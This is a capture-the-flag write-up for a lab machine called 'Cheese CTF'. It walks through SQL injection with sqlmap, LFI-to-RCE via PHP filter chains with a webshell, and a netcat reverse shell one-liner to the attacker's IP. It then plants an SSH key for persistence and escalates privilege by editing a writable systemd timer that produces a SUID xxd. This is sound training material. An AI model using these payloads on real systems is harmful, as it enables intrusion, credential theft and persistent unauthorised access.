# Cheese CTF - Easy

```sh
sudo vim /etc/hosts
# map cheesectf.thm to IP

nmap -T4 -p- -A -Pn -v cheesectf.thm
# had to stop this as all ports were shown as open
```

* The ```nmap``` scan had to be stopped in between as all ports were showing up as open; this is to misguide us so we can start from common services

* Starting with the webpage on port 80, we have 'The Cheese Shop' website - we can inspect the source code for any clues

* We have an email 'info@thecheeseshop.com', a login page at '/login.php' and a 'script.js' file - which we cannot read

* The login page has username & password fields - we can try common creds and simple injection payloads before going for bruteforce:

    ```sh
    # common creds like 'admin:admin' or 'admin:password' do not work
    # we can try for SQLi test

    sqlmap -u 'http://cheesectf.thm/login.php' --data='username=test&password=pass' --level=5 --risk=3
    ```

* ```sqlmap``` shows that time-based blind SQLi works and is redirected to <http://cheesectf.thm/secret-script.php?file=supersecretadminpanel.html>

* This page is the admin panel for 'The Cheese Shop'; we have 3 sections - Orders, Messages and Users

* There is no content for these pages; however we can see that it uses PHP filters. For example, the orders page is at <http://cheesectf.thm/secret-script.php?file=php://filter/resource=orders.html>

* We can try to get RCE from PHP filter wrappers (via LFI), step-by-step:

    * We can try to access the source code of the 'secret-script.php' first - <http://cheesectf.thm/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php> - this gives base64-encoded output; when decoded, it shows the PHP code used here:

        ```php
        <?php
        //echo "Hello World";
        if(isset($_GET['file'])) {
            $file = $_GET['file'];
            include($file);
        }
        ?>
        ```
    
    * This fetches the file without any sanitization, so LFI (local file inclusion) vulnerability can be exploited here to get RCE

    * We can similarly read local files such as ```/etc/passwd``` - <http://cheesectf.thm/secret-script.php?file=php://filter/convert.base64-encode/resource=/etc/passwd> (output to be decoded from base64)

    * Googling for RCE from PHP wrappers gives us references from [Medium](https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06) and [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters) - we can use the [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) script

    * Generate the payload using the PHP filter chain script and use it to get RCE:

        ```sh
        python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;;?>'
        # this generates a huge payload for the actual base64-encoded webshell code
        # which will be injected into php://temp

        FILTERS='php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp'
        # paste the entire payload into this var

        curl "http://cheesectf.thm/secret-script.php?0=id&file=$FILTERS" --output -
        # the $FILTERS payload is for the malicious PHP filter wrapper
        # '0' is the parameter for the webshell, to which we pass our commands
        # '--output -' has to be used for curl to print to terminal, even if it is binary (garbage chars included)
        ```
    
    * The output of ```id``` is shown, we are 'www-data' - as we have RCE, we can try to get a reverse shell now:

        ```sh
        # setup listener
        nc -nvlp 4444

        # get URL-encoded reverse shell one-liner from 'revshells.com' and use it to get RCE
        curl "http://cheesectf.thm/secret-script.php?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.14.73.62%204444%20%3E%2Ftmp%2Ff&file=$FILTERS" --output -
        # we have reverse shell now
        ```

* In our reverse shell as 'www-data':

    ```sh
    # stabilise reverse shell
    which python3
    # we have python3
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # now Ctrl+Z to background shell
    stty raw -echo; fg
    # press Enter twice

    pwd

    ls -la
    # browse the files

    cat login.php
    # we get the creds 'comte:VeryCheesyPassword'

    ls -la /home
    # we have only 'comte' user

    ls -la /home/comte/
    # we cannot get user flag yet, but we have '.ssh' directory

    ls -la /home/comte/.ssh
    # we have empty 'authorized_keys' file, and it seems writable

    # for persistent SSH session
    # on attacker
    ssh-keygen -f comte
    # no passwords

    chmod 600 comte

    cat comte.pub
    # copy the contents

    # in reverse shell as 'www-data'
    echo "<public key>" > /home/comte/.ssh/authorized_keys
    
    chmod 600 /home/comte/.ssh/authorized_keys
    # this does not work

    # in attacker
    ssh -i comte comte@cheesectf.thm
    # the SSH session still works and we have SSH as 'comte' now

    cat user.txt
    # user flag

    # now we can do basic enumeration for privesc

    sudo -l
    # this does not ask for password
    ```

* From the output of ```sudo -l```, we can see without entering password we can execute the following commands:

    ```sh
        (ALL) NOPASSWD: /bin/systemctl daemon-reload
        (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
        (ALL) NOPASSWD: /bin/systemctl start exploit.timer
        (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
    ```

* systemd 'timer' files are used for scheduling tasks, and are associated with corresponding service units ('.service' files) - so we need to check both the service and timer files:

    ```sh
    ls -la /etc/systemd/system/exploit*
    # exploit.service is not writable
    # but exploit.timer is writable by all

    cat /etc/systemd/system/exploit.service
    # this contains the following line
    # ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
    
    # this means it copies the 'xxd' binary to /opt, and sets the SUID and executable bit
    # we do not have a systemctl exploit on GTFObins, as that requires either writable service unit or 'status' command as sudo
    # but we have SUID exploit for 'xxd'

    cat /etc/systemd/system/exploit.timer
    # this does not have the OnBootSec variable defined
    # this will throw an error if we run it, but we can still try it

    sudo /bin/systemctl daemon-reload

    sudo /bin/systemctl enable exploit.timer

    sudo /bin/systemctl start exploit.timer
    # this fails to run the exploit service due to 'bad unit file setting'

    # we can check where the exact error is
    systemd-analyze verify exploit.timer
    # this shows 'timer unit lacks value setting'
    
    # we should not leave an empty value
    vim /etc/systemd/system/exploit.timer
    # OnBootSec=0

    # now we can reload the systemd daemon, enable and start the service unit
    sudo /bin/systemctl daemon-reload
    sudo /bin/systemctl enable exploit.timer
    sudo /bin/systemctl start exploit.timer

    ls -la /opt
    # now, we have xxd with SUID and executable bit here

    # use the GTFObins exploit for xxd to get the root flag
    LFILE=/root/root.txt

    /opt/xxd "$LFILE" | /opt/xxd -r
    # reads root flag
    ```